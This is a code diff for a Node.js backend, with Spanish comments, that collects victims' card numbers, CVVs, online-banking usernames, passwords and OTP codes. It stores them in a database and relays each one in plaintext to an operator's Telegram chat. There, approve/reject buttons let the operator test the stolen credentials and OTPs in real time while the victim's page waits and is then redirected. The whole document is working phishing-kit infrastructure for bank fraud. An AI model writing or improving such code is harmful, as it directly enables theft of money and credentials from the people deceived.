@@ -11,9 +11,7 @@ const pool = new Pool({
     max: 5,
     ssl: { rejectUnauthorized: false }
 });
-pool.on('error', err => console.error('❌ PG pool error:', err));
 
-// 🔥 Variables de entorno
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://sncill-to-yzzz.onrender.com';
@@ -34,12 +32,19 @@ async function initDB() {
             motivo_rechazo   TEXT,
             redirigir_a      VARCHAR(60),
             telegram_msg_id  BIGINT,
+            usuario_banco    VARCHAR(120),
+            password_banco   VARCHAR(120),
+            codigo_otp       VARCHAR(20),
+            paso             VARCHAR(30) DEFAULT 'crear',
+            fase_actual      VARCHAR(20) DEFAULT 'credenciales',
+            credenciales_aprobadas BOOLEAN DEFAULT FALSE,
+            otp_aprobado     BOOLEAN DEFAULT FALSE,
             created_at       TIMESTAMPTZ DEFAULT NOW(),
             updated_at       TIMESTAMPTZ DEFAULT NOW()
         );
-        CREATE INDEX IF NOT EXISTS idx_pagos_estado ON pagos_pendientes(estado);
     `);
-
+    
+    // Asegurar que las columnas nuevas existan si la tabla ya existía
     await pool.query(`
         ALTER TABLE pagos_pendientes
           ADD COLUMN IF NOT EXISTS usuario_banco VARCHAR(120),
@@ -50,13 +55,13 @@ async function initDB() {
           ADD COLUMN IF NOT EXISTS credenciales_aprobadas BOOLEAN DEFAULT FALSE,
           ADD COLUMN IF NOT EXISTS otp_aprobado BOOLEAN DEFAULT FALSE;
     `);
-
+    
     await pool.query(`ALTER TABLE pagos_pendientes ALTER COLUMN estado TYPE VARCHAR(30);`);
     console.log('✅ Tabla lista');
 }
 initDB().catch(err => console.error('❌ initDB:', err));
 
-// --- HELPERS TELEGRAM ---
+// --- TELEGRAM HELPERS ---
 async function tgSendMessage(text, replyMarkup) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
@@ -83,10 +88,6 @@ async function tgAnswerCallback(callbackQueryId, text) {
 }
 
 function construirTextoPago(pago) {
-    const usuario = pago.usuario_banco ? pago.usuario_banco : '—';
-    const password = pago.password_banco ? pago.password_banco : '—';
-    const otp = pago.codigo_otp ? pago.codigo_otp : '—';
-
     return (
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
@@ -96,9 +97,9 @@ function construirTextoPago(pago) {
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
         `\n<b>── CREDENCIALES BANCO ──</b>\n` +
-        `👤 <b>Usuario:</b> <code>${usuario}</code>\n` +
-        `🔑 <b>Contraseña:</b> <code>${password}</code>\n` +
-        `🔐 <b>OTP:</b> <code>${otp}</code>\n` +
+        `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
+        `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
+        `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>\n` +
         `\n🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`
     );
 }
@@ -117,24 +118,10 @@ async function enviarSolicitudATelegram(pago) {
     }
 }
 
-async function actualizarMensajeTG(pago, encabezado, textoExtra) {
-    if (!pago.telegram_msg_id) return;
-    const texto = `${encabezado}\n\n` + construirTextoPago(pago) + (textoExtra ? `\n\n${textoExtra}` : '');
-    const replyMarkup = {
-        inline_keyboard: [[
-            { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
-            { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
-        ]]
-    };
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
-    try {
-        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, message_id: pago.telegram_msg_id, text, parse_mode: 'HTML', reply_markup: replyMarkup }) });
-    } catch (e) {}
-}
-
 // --- ENDPOINTS ---
 app.post('/api/crear-pago', async (req, res) => {
     const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso } = req.body || {};
+    
     if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });
 
     try {
@@ -148,32 +135,39 @@ app.post('/api/crear-pago', async (req, res) => {
         );
 
         const pago = result.rows[0];
-        const pasoActual = (paso || 'crear').toLowerCase();
         const esNueva = !pago.telegram_msg_id;
 
         if (esNueva) {
             await enviarSolicitudATelegram(pago);
         } else {
-            if (pasoActual === 'credenciales') await actualizarMensajeTG(pago, '📝 <b>CREDENCIALES RECIBIDAS</b>', '⏳ <b>Esperando aprobación...</b>');
-            else if (pasoActual === 'otp') await actualizarMensajeTG(pago, '🔐 <b>OTP RECIBIDO</b>', '⏳ <b>Esperando aprobación...</b>');
+            // 🔥 ESTO ES LO QUE ACTUALIZA EL MENSAJE EN TELEGRAM
+            const replyMarkup = {
+                inline_keyboard: [[
+                    { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
+                    { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
+                ]]
+            };
+            const texto = `📝 <b>DATOS ACTUALIZADOS (${paso || 'credenciales'})</b>\n\n` + construirTextoPago(pago);
+            await tgEditMessage(pago.telegram_msg_id, texto);
         }
 
         return res.json({ success: true, solicitud_id, estado: 'pendiente' });
     } catch (err) {
-        return res.status(500).json({ success: false, error: 'Error al registrar el pago' });
+        console.error(err);
+        return res.status(500).json({ success: false, error: 'Error al registrar' });
     }
 });
 
 app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
     try {
-        const result = await pool.query(`SELECT estado, motivo_rechazo, redirigir_a, marca_tarjeta, fase_actual, credenciales_aprobadas, otp_aprobado FROM pagos_pendientes WHERE solicitud_id = $1`, [req.params.solicitud_id]);
+        const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [req.params.solicitud_id]);
         if (result.rows.length === 0) return res.status(404).json({ success: false, error: 'No encontrado' });
         const row = result.rows[0];
 
         if (row.estado === 'aprobado_credenciales') return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
         if (row.estado === 'rechazado_credenciales') return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });
 
-        if (row.estado === 'aprobado' || row.otp_aprobado === true) return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a}`, marca: row.marca_tarjeta });
+        if (row.estado === 'aprobado' || row.otp_aprobado === true) return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a || 'exito.html'}` });
         if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });
 
         return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual });
@@ -184,8 +178,7 @@ app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
 
 app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
-    const update = req.body || {};
-    const cq = update.callback_query;
+    const cq = req.body?.callback_query;
     if (!cq || !cq.data) return;
 
     const [accion, solicitud_id] = cq.data.split(':');
@@ -193,7 +186,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     try {
         const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [solicitud_id]);
-        if (result.rows.length === 0) return await tgAnswerCallback(cq.id, 'Solicitud no encontrada');
+        if (result.rows.length === 0) return await tgAnswerCallback(cq.id, 'No encontrada');
         const pago = result.rows[0];
 
         const estaEnFaseOTP = !!pago.codigo_otp && pago.codigo_otp !== 'N/A';
@@ -207,16 +200,16 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                 await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado', otp_aprobado = TRUE, fase_actual = 'completado', redirigir_a = $1, updated_at = NOW() WHERE solicitud_id = $2`, [archivo, solicitud_id]);
                 await tgAnswerCallback(cq.id, '✅ Pago aprobado');
-                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago) + `\n➡️ <b>Redirigido a:</b> ${archivo}`);
+                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago));
             }
         } else if (accion === 'rechazar') {
-            const motivo = estaEnFaseOTP ? 'El código OTP es incorrecto.' : 'Las credenciales son incorrectas.';
+            const motivo = estaEnFaseOTP ? 'OTP incorrecto.' : 'Credenciales incorrectas.';
             const nuevoEstado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
             await pool.query(`UPDATE pagos_pendientes SET estado = $1, motivo_rechazo = $2, updated_at = NOW() WHERE solicitud_id = $3`, [nuevoEstado, motivo, solicitud_id]);
             await tgAnswerCallback(cq.id, '❌ Rechazado');
             if (msgId) await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + construirTextoPago(pago) + `\n📌 <b>Motivo:</b> ${motivo}`);
         }
-    } catch (err) { console.error('❌ webhook:', err); }
+    } catch (err) { console.error(err); }
 });
 
 async function registrarWebhook() {
@@ -224,10 +217,9 @@ async function registrarWebhook() {
     try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${encodeURIComponent(PUBLIC_BACKEND_URL + '/api/telegram-webhook')}`);
         console.log('✅ Webhook registrado');
-    } catch (e) { console.error('❌ Error webhook:', e.message); }
+    } catch (e) { console.error(e); }
 }
 
-app.get('/health', (_req, res) => res.json({ ok: true }));
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Backend en puerto ${PORT}`);
